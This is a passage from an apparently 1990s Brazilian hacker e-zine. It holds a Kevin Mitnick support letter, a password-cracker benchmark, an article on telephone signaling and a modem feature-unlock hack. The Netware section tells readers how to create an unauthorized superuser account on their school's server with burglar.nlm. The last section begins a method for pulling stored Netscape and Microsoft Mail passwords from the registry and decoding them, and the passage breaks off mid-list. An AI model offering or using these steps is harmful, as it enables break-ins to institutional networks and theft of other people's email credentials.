+Durante a persegui&ccedil;&atilde;o iniciada em novembro de 1992 (ap&oacute;s a expedi&ccedil;&atilde;o de mandado de pris&atilde;o por viola&ccedil;&atilde;o de condicional), e que culminou em sua pris&atilde;o em 15 de fevereiro de 1995, <b>Kevin Mitnick</b> persistiu trabalhando, fazendo bicos para sobreviver. A motiva&ccedil;&atilde;o de <b>Kevin</b> para a "pirataria eletr&ocirc;nica compulsiva" nunca foi o dinheiro. Nunca usou de forma criminosa seus conhecimentos. <b>Kevin Mitnick nunca incitou nem cometeu atos de viol&ecirc;ncia</b>. <b>Kevin David Mitnick</b> &eacute; um hacker. Na defini&ccedil;&atilde;o de Jonathan Littman "um hacker ao velho estilo - Algu&eacute;m que criativamente persegue conhecimento e informa&ccedil;&atilde;o".
+<p>
+<h2><font size="4" color="#FF1111"><b>Direitos Humanos em Movimento</b></font></h2>
+Que o Governo e a sociedade americana d&ecirc;em a <b>Kevin Mitnick</b> uma real chance de reabilita&ccedil;&atilde;o na sociedade &eacute; apenas uma esperan&ccedil;a. Mas <b>EXIGIR</b> que o Estado lhe d&ecirc; um julgamento justo e condi&ccedil;&otilde;es carcer&aacute;rias saud&aacute;veis &eacute; uma realidade: <b>VOC&Ecirc;</b> pode fazer isto escrevendo apelos para a Ministra da Justi&ccedil;a Americana, Ms. Janet Reno. J&aacute; come&ccedil;amos nossa campanha <b><i>"Ajude Kevin"</b></i> enviando a seguinte carta:</p>
+<pre>
+MS. JANET RENO
+United States Secretary of Justice
+Department of Justice
+10th E. Constitution Ave, N.W., Room 4400
+Washington, D.C. 20530
+</pre>
+<p>Prezada Senhora:
+<p>De acordo com a imprensa de seu pr&oacute;prio pa&iacute;s e a imprensa internacional, o Sr. <b>Kevin David Mitnick</b> foi preso sob condi&ccedil;&otilde;es ilegais contrariando a Declara&ccedil;&atilde;o Universal dos Direitos Humanos e a pr&oacute;pria Constitui&ccedil;&atilde;o Americana. O mesmo encontra-se recluso no Metropolitan Detention Center, em Los angeles, Calif&oacute;rnia.</p>
+<p>Escrevo para solicitar a V.Exa. que assegure um julgamento justo e condi&ccedil;&otilde;es carcer&aacute;rias saud&aacute;veis para o Sr. <b>Kevin David Mitnick</b>. Minha preocupa&ccedil;&atilde;o &eacute; baseada em princ&iacute;pios human&iacute;sticos e fundamentais do Direito Internacional.</p>
+<p>Atenciosamente,</p>
+<p></p>
+_________________________________
+<p>Assinatura</p>
+<p></p>
+<p>Nota: Voc&ecirc; pode escreve-la em portugu&ecirc;s ou preferencialmente em ingl&ecirc;s.</a>.</p>
+<p></p>
+<p>O importante &eacute; fazer a carta e envi&aacute;-la o mais breve poss&iacute;vel pelo Correio. Pe&ccedil;a a seus amigos, parentes, conhecidos, amigos da Internet para fazerem o mesmo. Sua carta se juntar&aacute; a muitas outras e sem d&uacute;vida esta press&atilde;o ratificar&aacute; o desejo de todos de fazer com que a Declara&ccedil;&atilde;o Universal dos Direitos Humanos seja uma realidade em movimento. Para <b>Kevin Mitnick</b>. Para todos. Sem distin&ccedil;&atilde;o.</p>
+<p></p>
+Abra&ccedil;os,
+Fernanda Serpa e equipe.
+<p></p>
+<p>Se voc&ecirc; quiser entrar em contato conosco o E-mail &eacute;:
+<a href="mailto:fserpa@netmarket.com.br">fserpa@netmarket.com.br</a>
+<p>*Nota do autor: A Sra. Fernada Serpa tem o total apoio de toda equipe da HUB no que for preciso para colabora&ccedil;&atilde;o
+nesta campanha pelos direitos humanos. Pense bem, amanh&atilde; pode ser que voc&ecirc; esteja na mesma situa&ccedil;&atilde;o dele.
+(<a href="mailto:cyberoptik@hackhour.com.br">Cyber Optik</a>)
+<p><a href="#index">Volta ao in&iacute;cio</a>
+<p><hr><p>
+<center><a name="Brutes"> <h1>Teste: Qual Brute &eacute; melhor???</h1></a></center>
+<center><table cellspacing=0 cellpadding=0 width="100%" >
+<tr align=center valign=center bgcolor="#C0C0C0">
+<th valign=center nowrap width="30%"><font color="#000000">Cracker</font></th>
+<th valign=center nowrap width="10%"><font color="#000000">Time</font></th>
+<th valign=center nowrap width="15%"><font color="#000000">Compara&ccedil;&atilde;o
+por Segundo</font></th>
+<th align=center valign=center nowrap><font color="#000000">Observa&ccedil;&otilde;es</font></th>
+</tr>
+<tr valign=center bgcolor="#00FF00">
+<td><font color="#000000"><font size=-1>John the ripper 1.4</font></font></td>
+<td align=right><font color="#000000"><font size=-1>6'15''</font></font></td>
+<td align=right><font color="#000000"><font size=-1>26667c/s</font></font></td>
+<td align=center><font color="#000000">.</font></td>
+</tr>
+<tr valign=center bgcolor="#008000">
+<td><font color="#FFFFFF"><font size=-1>John the ripper 1.31</font></font></td>
+<td align=right><font color="#FFFFFF"><font size=-1>6'30''</font></font></td>
+<td align=right><font color="#FFFFFF"><font size=-1>25641c/s</font></font></td>
+<td align=center><font color="#FFFFFF">.</font></td>
+</tr>
+<tr valign=center bgcolor="#008000">
+<td><font color="#FFFFFF"><font size=-1>John the ripper 1.0</font></font></td>
+<td align=right><font color="#FFFFFF"><font size=-1>8'05''</font></font></td>
+<td align=right><font color="#FFFFFF"><font size=-1>20619c/s</font></font></td>
+<td align=center><font color="#FFFFFF">.</font></td>
+</tr>
+<tr valign=center bgcolor="#776F09">
+<td><font color="#FFFFFF"><font size=-1>Star Crack 0.64&szlig;</font></font></td>
+<td align=right><font color="#FFFFFF"><font size=-1>9'15''</font></font></td>
+<td align=right><font color="#FFFFFF"><font size=-1>18018c/s</font></font></td>
+<td align=center><font color="#FFFFFF">.</font></td>
+</tr>
+<tr valign=center bgcolor="#776F09">
+<td><font color="#FFFFFF"><font size=-1>Star Crack 0.51&szlig;</font></font></td>
+<td align=right><font color="#FFFFFF"><font size=-1>11'25''</font></font></td>
+<td align=right><font color="#FFFFFF"><font size=-1>14599c/s</font></font></td>
+<td align=center><font color="#FFFFFF">.</font></td>
+</tr>
+<tr valign=center bgcolor="#776F09">
+<td><font color="#FFFFFF"><font size=-1>Cracker Jack 1.4</font></font></td>
+<td align=right><font color="#FFFFFF"><font size=-1>13'33''</font></font></td>
+<td align=right><font color="#FFFFFF"><font size=-1>12300c/s</font></font></td>
+<td align=center><font color="#FFFFFF">.</font></td>
+</tr>
+<tr valign=center bgcolor="#FFFF00">
+<td><font color="#000000"><font size=-1>Cracker Jack 1.3 386</font></font></td>
+<td align=right><font color="#000000"><font size=-1>14'55''</font></font></td>
+<td align=right><font color="#000000"><font size=-1>11173c/s</font></font></td>
+<td align=center><font color="#000000">.</font></td>
+</tr>
+<tr valign=center bgcolor="#FFFF00">
+<td><font color="#000000"><font size=-1>Cracker Jack 1.3 8086</font></font></td>
+<td align=right><font color="#000000"><font size=-1>22'22''</font></font></td>
+<td align=right><font color="#000000"><font size=-1>7452c/s</font></font></td>
+<td align=center><font color="#000000">.</font></td>
+</tr>
+<tr valign=center bgcolor="#FFFF00">
+<td><font color="#000000"><font size=-1>Hades 1.00a</font></font></td>
+<td align=right><font color="#000000"><font size=-1>47'05''</font></font></td>
+<td align=right><font color="#000000"><font size=-1>3540c/s</font></font></td>
+<td align=center><font color="#000000">.</font></td>
+</tr>
+<tr valign=center bgcolor="#FF8080">
+<td><font color="#FFFFFF"><font size=-1>Brute 2.00</font></font></td>
+<td align=right><font color="#FFFFFF"><font size=-1>(est)59'54''</font></font></td>
+<td align=right><font color="#FFFFFF"><font size=-1>2782c/s</font></font></td>
+<td align=center><font color="#FFFFFF">.</font></td>
+</tr>
+<tr valign=center bgcolor="#FF8080">
+<td><font color="#FFFFFF"><font size=-1>PCUPC 2.01</font></font></td>
+<td align=right><font color="#FFFFFF"><font size=-1>(est)135'37''</font></font></td>
+<td align=right><font color="#FFFFFF"><font size=-1>1229c/s</font></font></td>
+<td align=center><font color="#FFFFFF"><font size=-1>Suporta somente arquivos de passwords
+com at&eacute; 500 linhas</font></font></td>
+</tr>
+<tr valign=center bgcolor="#FF8080">
+<td><font color="#FFFFFF"><font size=-1>Guess 2.1</font></font></td>
+<td align=right><font color="#FFFFFF"><font size=-1>(est)141'58''</font></font></td>
+<td align=right><font color="#FFFFFF"><font size=-1>1174c/s</font></font></td>
+<td align=center><font color="#FFFFFF"><font size=-1>Suporta somente arquivos de passwords
+com at&eacute; 1000 linhas</font></font></td>
+</tr>
+<tr valign=center bgcolor="#FF8080">
+<td><font color="#FFFFFF"><font size=-1>Killer Cracker 9.5</font></font></td>
+<td align=right><font color="#FFFFFF"><font size=-1>(est)151'12''</font></font></td>
+<td align=right><font color="#FFFFFF"><font size=-1>1105c/s</font></font></td>
+<td align=center><font color="#FFFFFF"><font size=-1>Suporta somente arquivos de passwords
+com at&eacute; 1000 linhas</font></font></td>
+</tr>
+<tr valign=center bgcolor="#FF8080">
+<td><font color="#FFFFFF"><font size=-1>Xit 2.0</font></font></td>
+<td align=right><font color="#FFFFFF"><font size=-1>(est)195'37''</font></font></td>
+<td align=right><font color="#FFFFFF"><font size=-1>852c/s</font></font></td>
+<td align=center><font color="#FFFFFF">.</font></td>
+</tr>
+<tr valign=center bgcolor="#FF0000">
+<td><font color="#FFFFFF"><font size=-1>Hellfire Cracker 1.3</font></font></td>
+<td align=right><font color="#FFFFFF"><font size=-1>infinito</font></font></td>
+<td align=right><font color="#FFFFFF"><font size=-1>0c/s</font></font></td>
+<td align=center><font color="#FFFFFF"><font size=-1>N&atilde;o consegui terminar o teste, pois ele deu pau.</font></font></td>
+</tr>
+</table></center>
+<p>Este teste foi feito com um Pentium 133, com 16MB de RAM, com um cache de 2MB. A Word List tinha s&oacute; 10000 palavras(n&atilde;o deu tempo de gerar uma maior e o arquivo de passwords tem 1000 passwords, ele achou 554 passwords.
+
+<p><a href="#index">Volta ao in&iacute;cio</a>
+<p><hr><p>
+
+<h1><center>
+<a name="Netware">Hackeando o Netware da sua escola...</a>
+</center></h1>
+
+Ensinarei aqui como criar uma conta com nivel de Superusuario.<br>
+&Eacute; muito f&aacute;cil, qualquer ser vivo consegue (at&eacute; uma samambaia!). S&oacute; tem um problema... &eacute; preciso usar um arquivo bin&aacute;rio (que n&atilde;o posso colocar no texto, mas segue em anexo no zine)... <br>
+Bom vamos l&aacute; !!!<br>
+(O processo descrito a seguir deve ser executado diretamente no servidor da rede)
+Saia do Monitor, ou qualquer coisa que esteja sendo executada no momento,
+caia no prompt da rede. Digite a seguinte linha:
+<p>
+"load a:\burglar.nlm super-arg"
+<p>
+&Eacute; claro que voc&ecirc; pode mudar esse SUPER-ARG !!!!, que &eacute; o nome da conta.<br>
+F&aacute;cil n&eacute; ??? <br>
+NAO ME RESPONSABILIZO POR NADA OK ?????<br>
+SE NAO FUNCIONAR OU DER PAU NO SEU SERVIDOR, .... PROBLEMA SEU !!!<br>
+ISSO AI FOI TESTADO EM UM SERVIDOR RODANDO NETWARE 3.11....<br>
+<center>[]'s ARG</center>
+
+<p><a href="#index">Volta ao in&iacute;cio</a>
+<p><hr><p>
+
+<h1><center>
+<a name="Tel">TELEFONIA NO BRASIL</a>
+</center></h1>
+
+Este texto n&atilde;o tem a pretens&atilde;o de se tornar uma B&iacute;blia no assunto, que de t&atilde;o extenso n&atilde;o pode ser totalmente explicado em apenas um artigo. A id&eacute;ia b&aacute;sica foi de complementar um artigo escrito pelo colega Derneval (Barata El&eacute;trica) para a 2600. Neste artigo Derneval mostra aos americanos a situa&ccedil;&atilde;o ca&oacute;tica de nosso Sistema Telef&ocirc;nico, realmente "it sucks". Por&eacute;m, ao contr&aacute;rio do que muitos pensam, nosso sistema n&atilde;o &eacute; t&atilde;o antigo assim. Boa parte de nossa rede est&aacute; digitalizada, apesar de ainda existirem algumas Centrais Telef&ocirc;nicas do tipo passo-a-passo em opera&ccedil;&atilde;o (inclusive em S&atilde;o Paulo, como na regi&atilde;o central e Pinheiros). Nosso grande problema est&aacute; na colcha de retalhos que &eacute; nossa rede: centrais antigas interligadas a centrais digitais, de fabricantes diferentes com certas incompatibilidades em sua troca de sinaliza&ccedil;&atilde;o.
+<p>
+Entende-se por "sinaliza&ccedil;&atilde;o" ao protocolo de comunica&ccedil;&atilde;o entre centrais, com o intuito de se completar uma chamada telef&ocirc;nica. Esta sinaliza&ccedil;&atilde;o pode ser de dois tipos: de linha ou registro. A sinaliza&ccedil;&atilde;o de linha &eacute; conhecida por todos, s&atilde;o os tons de discagem, campainha, etc. A sinaliza&ccedil;&atilde;o de registro &eacute; usada basicamente para a transmiss&atilde;o das caracter&iacute;sticas dos assinantes telef&ocirc;nicos a central e entre outras fun&ccedil;&otilde;es define o modo de tarif&aacute;-los.
+<p>
+Deste modo, este  artigo ir&aacute; detalhar um pouco mais este &uacute;ltimo tipo de sinaliza&ccedil;&atilde;o, que pode ser de dois tipos: de "Canal Associado" ou de "Canal Comum".
+<p>
+Explicando melhor: as chamadas telef&ocirc;nicas trafegam pela rede telef&ocirc;nica atrav&eacute;s de feixes de 2Mbps (o famoso feixe E1), que s&atilde;o formados por 32 canais de 64Kbps que contem 30 chamadas telef&ocirc;nicas e/ou informa&ccedil;&otilde;es de sinaliza&ccedil;&atilde;o. 
+<p>
+As centrais antigas (passo-a-passo ou Crossbar) usam a sinaliza&ccedil;&atilde;o por Canal Associado. Nestas, a sinaliza&ccedil;&atilde;o trocada entre as centrais de comuta&ccedil;&atilde;o telef&ocirc;nica consiste de sinais ac&uacute;sticos que s&atilde;o trocados durante o estabelecimento e fim de uma liga&ccedil;&atilde;o. Assim, quando o chamado "Assinante A" (que origina a chamada) inicia a discagem, a central  de destino ou uma intermedi&aacute;ria interpreta o d&iacute;gito e pelo mesmo canal ocupado pela chamada envia um sinal (A1) para a central na qual o assinante A est&aacute; plugado, solicitando o envio do pr&oacute;ximo digito, assim sendo at&eacute; a chamada se completar. Da&iacute; o nome de "Canal Associado", pois tanto a voz quanto a sinaliza&ccedil;&atilde;o seguem pelo mesmo canal.
+<p>
+Nas centrais digitais (CPA) a brincadeira &eacute; um pouco diferente: elas devem ser capazes de interpretar a sinaliza&ccedil;&atilde;o das centrais antigas para garantir o funcionamento entre elas, mas quando a sinaliza&ccedil;&atilde;o envolve duas CPA's um protocolo diferente &eacute; utilizado: a sinaliza&ccedil;&atilde;o por "Canal Comum". Neste caso, do feixe E1 30 canais s&atilde;o utilizados para voz, um para sincronismo e o outro para as informa&ccedil;&otilde;es de sinaliza&ccedil;&atilde;o de todas as chamadas telef&ocirc;nicas do feixe. Dai o nome "Canal Comum": todas as sinaliza&ccedil;&otilde;es compartilham apenas um canal. Este tipo de sinaliza&ccedil;&atilde;o recebe no Brasil o nome de "Sinaliza&ccedil;&atilde;o por Canal Comum Numero 7", e &eacute; uma mescla de caracter&iacute;sticas do padr&atilde;o europeu  (ITU-T N7) com o americano (SS7), da&iacute; os problemas: cada fabricante interpreta as normas Telebr&aacute;s do modo que atende melhor, algumas tendendo para o americano e outros para o europeu. A principal diferen&ccedil;a entre os protocolos (al&eacute;m do fato do sistema americano usar um feixe T1 de 1.5Mbps em vez do E1 de 2Mbps) est&aacute; nos subsistemas utilizados. Vendo-se na figura abaixo:
+<p><pre>
+                                      SINALIZACAO N7
+
+                          Celular       Equip. ISDN    Telefone Comum
+                             |               |               |
+                        ----------      ----------      ----------
+      Subsistemas ..... |  IS41  |      |  ISUP  |      |   TUP  | ...(outros)
+      de Usuarios       ----------      ----------      ----------
+         (UP's)              |               |               |
+                             |               |               |
+                 ---------------------------------------------------------
+                 |                                                       |
+                 |                           MTP                         |
+                 |                                                       |
+                 ---------------------------------------------------------
+</pre>
+<p>
+Aos familiarizados com TCP/IP, o esquema acima segue o modelo OSI de comunica&ccedil;&atilde;o por camadas: as camadas 1 a 3, de n&iacute;vel mais pr&oacute;ximo ao hardware s&atilde;o cuidadas pelo MTP (Message Transfer Part, ou Subsistema de Transferencia de Mensagens), que se encarrega de transmitir os pacotes de sinaliza&ccedil;&atilde;o pela rede. 
+<p>
+As camadas 4 a 7 s&atilde;o cobertas pelos Subsistemas de Usu&aacute;rios (UP's). Entende-se por usuario os diversos tipos de equipamentos que necessitam de uma Central de Comuta&ccedil;&atilde;o: telefones fixos, celulares, computadores com conex&atilde;o ISDN,  qualquer coisa que venha a ser inventada no futuro, basta que se crie o seu pr&oacute;prio subsistema. 
+<p>
+Voltando as diferen&ccedil;as entre o padr&atilde;o americano e europeu: o padr&atilde;o europeu prev&ecirc; o Subsistema de Usu&aacute;rio de Telefonia (TUP Telephone User-Part) e o Subsistema de Usu&aacute;rio ISDN (ISUP ISDN User-Part) como aplica&ccedil;&otilde;es distintas. Neste caso, existem mensagens diferentes para telefones comuns e equipamentos ISDN. O sistema americano considera que um telefone nada mais &eacute; do que um equipamento ISDN "pobre", ignorando o subsistema TUP e adotando-se apenas o ISUP em sua rede. Neste caso a troca de sinaliza&ccedil;&atilde;o &eacute; mais simples, basta apenas que as centrais de comuta&ccedil;&atilde;o dos diversos fabricantes sejam fluentes em ISUP e as mensagens que discriminam os diferentes equipamentos ISDN identifiquem o mesmo como "telefone comum". A rede americana esta' pronta para ISDN. 
+<p>
+E o Brasil? 
+<p>
+Aqui a coisa veio por partes: sendo o Sistema Telebras uma estatal, n&atilde;o se pode escolher um determinado fabricante e encomendar uma Central de Comuta&ccedil;&atilde;o de sua prefer&ecirc;ncia. Antes &eacute; preciso abrir uma concorr&ecirc;ncia publica, em que s&atilde;o definidos os requisitos necess&aacute;rios e ser&aacute; declarado vencedor aquele que apresentar o MENOR PRE&Ccedil;O (esta' impl&iacute;cito que ele atende as exig&ecirc;ncias por este pre&ccedil;o...); assim um fabricante ganha em uma regi&atilde;o, outro em outra e "todos ficam felizes". Se a pr&aacute;tica fosse perfeita como a teoria... 
+<p>
+Assim, em primeira etapa exigiu-se apenas que se falassem com um telefone: todos deveriam suportar apenas TUP. N&atilde;o houve grandes problemas, o TUP j&aacute; era definido pelo ITU-T (antigo CCITT) e dominado por todos os grandes fabricantes. O problema veio alguns anos mais tarde: telefonia celular, ISDN, etc. 
+<p>
+Concorr&ecirc;ncias abertas, cada fabricante jurava que seu sistema era compat&iacute;vel com os demais, MAS..... 
+<p>
+Assim, temos centrais telef&ocirc;nicas que suportam apenas o protocolo IS41 vers&atilde;o A enquanto todas as outras trabalham com a vers&atilde;o B.... O software n&atilde;o permite upgrade e n&atilde;o &eacute; poss&iacute;vel devolver o hardware sem profundos problemas pol&iacute;ticos (um empres&aacute;rio muito poderoso do ramo de Telecomunica&ccedil;&otilde;es no Brasil det&eacute;m o controle acion&aacute;rio de uma empresa) O mesmo pode ser dito de ISDN: cada fabricante interpreta as normas Telebras pelo seu ponto de vista. 
+<p>
+Assim, como podemos sonhar com uma linha ISDN se n&atilde;o ha compatibilidade em todo o territ&oacute;rio nacional? 
+<p>
+Ou mais simples ainda: como sonhar com um SIMPLES TELEFONE, se a rede nacional esta' t&atilde;o congestionada? Sim, pois para se vencer uma concorr&ecirc;ncia com o MENOR PRECO o produto deve ser o mais enxuto poss&iacute;vel, mesmo que n&atilde;o permita futuros upgrades... 
+<p>
+E...... 
+<p>
+Aos que ficaram interessados e devem estar se perguntando: &eacute; poss&iacute;vel o uso de BOXES no Brasil? Se o sistema usar Sinaliza&ccedil;&atilde;o N7 NAO! N&atilde;o &eacute; poss&iacute;vel enviar tons pelo mesmo canal de voz para tentar enganar a central telef&ocirc;nica; a sinaliza&ccedil;&atilde;o segue por um canal a parte (canal n.16 no Brasil e Europa e n.9 nos Estados Unidos). Mesmo se for conseguido o acesso ao canal de sinaliza&ccedil;&atilde;o um eventual phracker devera' "montar" uma mensagem desejada (por exemplo, transformar um assinante tarifado em um n&atilde;o - tarifado) e enviar no momento certo, com os bits seq&uuml;enciais corretos, etc... <p>
+Como a nossa rede telef&ocirc;nica &eacute; muito grande, uma simples chamada telef&ocirc;nica (mesmo local) devera' passar por varias centrais, fatalmente uma delas ser&aacute; digital. Ent&atilde;o, adeus boxes (na maior parte das vezes).
+<p>
+Porem, "presume-se" que existam comandos nas centrais que s&atilde;o usados para depura&ccedil;&atilde;o de software, montando-se mensagens e enviando diretamente ao link. Como acessar uma central telef&ocirc;nica remotamente e enviar comandos a ela, e quais s&atilde;o esses comandos isto j&aacute; &eacute; outra historia ...
+<p>
+[  ]`s
+<p>
+Ben Reilly
+
+<p><a href="#index">Volta ao in&iacute;cio</a>
+<p><hr><p>
+
+<a name="Modem"><h1><center>Como transformar seu modem UsRobotics Sportster em um Courier</h1></center></a>
+<h2> Como e por que isso &eacute; poss&iacute;vel?</h2>  
+A Us Robotics, quando fabrica o Sportster e o Courier, para diminuir  o custo do material, utiliza praticamente o mesmo hardware para os  dois modems. O que eles fazem &eacute; configurar como habilitado s&oacute; alguns protocolos do chipset para o Sportster enquanto habilita TODOS para os modems Courier. Sacanagem? Sem d&uacute;vida...... Mas vamos descontar isso agora... hehehe... :)
+
+<h2>T&aacute; bom, o que eu ganho fazendo meu modem virar Courier? </h2>
+Os modems modelo Courier possuem algumas habilidades interessantes... Protocolo HST: Protocolo desenvolvido pra linhas telef&ocirc;nicas muito podres. Pra quem n&atilde;o consegue conectar com V.32bis ou que se conecta a 1200bps. Ele possibilita conex&otilde;es de 16800 na linha mais podre poss&iacute;vel (at&eacute; com um modem 14.400).
+<p>
+Protocolo ASL: Uma habilidade extremamente interessante dos Courier's  da vida... Esse protocolo permite que, se voc&ecirc; se conectar a uma  velocidade mais baixa do que a m&aacute;xima permitida pelo seu modem por motivos de ru&iacute;dos na linha telef&ocirc;nica e, depois, a qualidade da linha melhorar, ele aumenta a velocidade sem perder a conec&ccedil;&atilde;o atual.
+<p>
+Fast Retrains: Diminui o tempo que o modem leva pra sincronizar a sua  velocidade com o outro modem que ele est&aacute; falando... diminui dos 10 ou 15 segundos padr&atilde;o pra 1 ou 2 segundos.
+
+<h2>Ok... Beleza, me ensina ent&atilde;o....</h2>
+A t&aacute;tica consiste em resetar a RAM do modem e colocar l&aacute; os par&acirc;metros para ele habilitar os protocolos do courier. Abra um programa de comunica&ccedil;&otilde;es qqer (pode ser o Telix pra DOS, o HyperTerm pro Win95 ou qqer outro equivalente...) e digite o seguinte comando abaixo:
+<p>
+ATY14 &lt;enter&gt;
+<p>
+A resposta vai ser parecida com isso:
+<p>
+000,000,006,007,002,000 (&oacute;bvio que seus n&uacute;meros ser&atilde;o diferentes...)
+<p>
+Bom, essas s&atilde;o as configura&ccedil;&otilde;es atuais do seu modem... Eu aconselho que voc&ecirc; anote isso num lugar seguro.... Alguns modems n&atilde;o funcionam  mais depois que voc&ecirc; tira a configura&ccedil;&atilde;o original deles, ent&atilde;o voc&ecirc; pode precisar disso...
+<p>
+Bom, &oacute;timo.
+<ul>
+<li>Os dois primeiros n&uacute;meros da configura&ccedil;&atilde;o do modem (neste caso o  000,006) n&atilde;o servem para absolutamente nada, ou seja, tah aih soh pr&aacute; encher o nosso saco... hehehe... :)
+<li>O terceiro n&uacute;mero &eacute; o q habilita a configura&ccedil;&atilde;o do ASL... Eu recomendo que esse n&uacute;mero seja 6.
+<li>O quarto n&uacute;mero &eacute; o que muda os protocolos de FAX. Eu recomendo que seja 15 (todos os protocolos ligados).
+<li>O quinto n&uacute;mero &eacute; o que habilita os V.xx's e o HST. Eu recomendo 15 novamente (tudo habilitado).
+<li>O sexto n&uacute;mero &eacute; o c&oacute;digo de pa&iacute;s do seu modem... Parece besteira alterar isso mas n&atilde;o &eacute;... O c&oacute;digo do Jap&atilde;o (1) permite uma discagem pulso extremamente r&aacute;pida, o c&oacute;digo Internacional (17) habilita o registro S39 para a altera&ccedil;&atilde;o do volume do falantinho do modem, o c&oacute;digo dos Estados Unidos (0) &eacute; o que melhor detecta sinal de  ocupado.... Ent&atilde;o, escolha voc&ecirc; mesmo.
+</ul><p>
+Bom digamos que voc&ecirc; queira instalar todos os protocolos e usar o c&oacute;digo de pa&iacute;s dos Estados unidos. Ent&atilde;o a sua configura&ccedil;&atilde;o deve ficar exatamente assim:
+<p>
+000,000,006,015,015,000
+<p>
+<h2>Como proceder pr&aacute; programar?</h2>
+Chegou a parte mais divertida da opera&ccedil;&atilde;o... A t&eacute;cnica funciona tanto em modems internos como externos (&oacute;bvio, no interno &eacute; m&oacute; saco de fazer).
+<p>
+Primeiro, desligue o modem, e se seu modem for interno, ranca fora por q vai ser necess&aacute;rio. Voc&ecirc; ter&aacute; que encontrar na placa do seu modem (se voc&ecirc; tiver um modem externo eu aconselho que voc&ecirc; o desmonte primeiro, tirando a capa de pl&aacute;stico dele) um chipzinho rid&iacute;culo com menos de 1cm de comprimento, quatro perninhas em cima, quatro em baixo, com o c&oacute;digo 93c66 ou 93/66... &eacute; extremamente pequeno e eu aconselho que voc&ecirc; tenha uma boa lupa...
+<p>
+<center>
+<img src="sp2cour.jpg" width=115 height=122 border=0>
+</center>
+<p>
+Pegue um prego, um peda&ccedil;o de fio, uma chave de fenda, ou qualquer porcaria que seja condutor de eletricidade e junte a primeira perninha do chip com a segunda (a primeira &eacute; akela que tem uma bolinha em cima...) Num solda o prego pq depois do modem estiver ligado e o programa de comunica&ccedil;ao estiver rodando, voc&ecirc; vai precisar tirar esse curto da placa... Beleza. Coloca o modem no lugar (se for interno, &oacute;bvio) e entra no  programa de comunica&ccedil;&atilde;o. o primeiro comando a ser digitado deve ser o de Reset do modem:
+<p>
+ATZ &lt;enter&gt;
+<p>
+Beleza. Ranca fora o prego, fio ou equivalente que estava juntando o pino 1 e 2 do CI. Digita agora:
+<p>
+ATY14 &lt;enter&gt;
+<p>
+A resposta tem que ser exatamente assim:
+<p>
+,,,,,
+<p>
+Se a resposta for diferente disso, o curto no pino 1 e 2 n&atilde;o funcionou.  Tira o modem de novo e encosta essas perninhas do jeito certo... :)
+<p>
+Se tudo correu na buena at&eacute; agora, seu modem est&aacute; pronto pra ser quase que totalmente reprogramado... A&iacute; segue a lista dos comandos na ordem q  deve ser digitada...
+<p>
+AT&L73=0 &lt;enter&gt; (Registrador nulo de configura&ccedil;&atilde;o)<br>
+AT&L67=0 &lt;enter&gt; (Registrador nulo de configura&ccedil;&atilde;o)<br>
+AT&L31=6 &lt;enter&gt; (Registrador de ASL)<br>
+AT&L29=15 &lt;enter&gt; (Registrador de protocolos de FAX)<br>
+AT&L19=15 &lt;enter&gt; (Registrador de V.xx e HST)<br>
+AT&L14=0 &lt;enter&gt; (C&oacute;digo de pa&iacute;s, escolha qqer um dos listados acima)<br>
+<p>
+Todos estes comandos devem responder OK. Digite:
+<p>
+ATNX &lt;enter&gt;
+<p>
+Esse comandinho salva as configura&ccedil;&otilde;es e recarrega os protocolos do modem. Ele n&atilde;o deve dar nenhuma resposta (nem OK)... Digite agora:
+<p>
+AT&F1&W &lt;enter&gt;
+<p>
+Seu modem deve responder OK. Se ele n&atilde;o responder, ele n&atilde;o suporta algum dos protocolos acima e vai ficar travado at&eacute; voc&ecirc; reconfigur&aacute;-lo... Veja no fim deste texto a parte de problemas. Se tudo funcionou bem, digite:
+<p>
+ATB1S34=8 &lt;enter&gt; (string de Courier)
+<p>
+e seja feliz com o seu novo modem!.... :)
+<p>
+<h2>Problemas</h2>
+Algums modems mais novos, n&atilde;o possuem todos os protocolos no chipset e poder&atilde;o "travar" com a nova configura&ccedil;&atilde;o. Pr&aacute; fazer ele voltar a funcionar, &eacute; simples:<p> Desligue ele, junte as "perninhas" do 93/66 e ligue o modem de novo... E reprograme ele com as configura&ccedil;&otilde;es originais.
+<p>
+EarthQuake
+
+<p><a href="#index">Volta ao in&iacute;cio</a>
+<p><hr><p>
+ 
+<h1><center>
+<a name="Netscape">Crackeando o Netscape e os passwords do Microsoft Mail</a>
+</center></h1>
+
+Escrito por the.avatar e traduzido por BAT
+
+<h2>Sistemas Afetados</h2>
+Sistemas que rodam Netscape 3.01 Gold; <br>
+Sistemas que rodam o Microsoft Internet Mail 4.70x <br>
+
+<h2>Descri&ccedil;&atilde;o</h2>
+Crackear os passwords para estes mail clients &eacute; t&atilde;o f&aacute;cil quanto uma simples decodifica&ccedil;&atilde;o em MIME63!  
+
+<h2>Demonstra&ccedil;&atilde;o</h2>:  
+<h3>NETSCAPE</h3>  
+O sistema de encripta&ccedil;&atilde;o de password de E-mail &eacute; realmente fraco. Eu fui capaz de fazer uma cript-analyse em aproximadamente 20 minutos. H&aacute; dois m&eacute;todos para quebrar uma senha: voc&ecirc; precisa usar os m&eacute;todos abaixo: O Non-Coder, e o Coderz.
+<p>
+Eu s&oacute; testei este m&eacute;todo com meu (velho) Netscape Navigator 3.01 Gold, mas eu seguramente s&oacute; trabalharia com NS2.0, at&eacute; mesmo com vers&otilde;es de 16bit. Eu ainda estou investigando as de possibilidades de crackear essas vers&otilde;es mais antigas.
+<p>
+!!!E para esses que pensam o Internet Explorer est&aacute; mais seguro!!! <br>
+!!!Leiam a &uacute;ltima se&ccedil;&atilde;o!!!
+<p>
+A senha pode ser achada no registro na seguinte string:
+<p>
+HKEY_CURRENT_USER\Software\Netscape\Netscape Navigator\Mail\POP Password 
+<p>
+
+<h2>Sobre a encripta&ccedil;&atilde;o:</h2>  
+A  encripta&ccedil;&atilde;o &eacute; finalizada deste modo: <p>
+1. passe a senha por uma chave de XOR (encriptada nesse documento);  <br>
+2. Codifique usando MIME .  <br>
+Para Decodificar, voc&ecirc; simplesmente precisa reverter a opera&ccedil;&atilde;o (realmente!;) 
+
+<h2>M&eacute;todo Non-Coder</h2>  
+<h3>Material necess&aacute;rio:</h3>
+<li>Netscape Navigator instalado em seu computador<br>
+<li>Um Port listener/dumper <br>
+<li>Um password!<br>
+O que fazer:
+<ul>
+<li>V&aacute; ao registro. Sete o POP Password para o password que voc&ecirc; deseja hackear.  
+<li>Ainda no registro, sete o POP Server para 127.0.0.1  <br>
+(HKEY_CURRENT_USER\Software\Netscape\Netscape Navigator\Services\POP_Server)
